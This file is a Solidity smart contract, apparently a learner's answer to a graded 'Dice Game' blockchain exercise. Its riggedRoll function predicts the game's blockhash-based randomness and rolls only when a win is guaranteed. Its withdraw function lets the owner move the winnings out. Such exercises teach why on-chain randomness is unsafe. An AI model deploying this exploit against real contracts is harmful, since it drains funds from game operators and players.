pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// `receive()` function to allow the contract to receive Ether
	receive() external payable {}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(
		address payable _addr,
		uint256 _amount
	) external onlyOwner {
		require(address(this).balance >= _amount, "Insufficient balance");
		(bool sent, ) = _addr.call{ value: _amount }("");
		require(sent, "Failed to send Ether");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() external payable {
		require(
			address(this).balance >= 0.002 ether,
			"Not enough Ether to roll"
		);

		// Fetch the previous block's hash and the contract address for randomness
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
		);

		uint256 roll = uint256(hash) % 16;
		console.log("Predicted Dice Roll: ", roll);

		// If the prediction is favorable (i.e., roll <= 5), call rollTheDice()
		if (roll <= 5) {
			// Send the required Ether to the DiceGame contract's rollTheDice() function
			diceGame.rollTheDice{ value: 0.002 ether }();
		} else {
            revert("Predicted roll is unfavorable, try again");
        }
	}
}
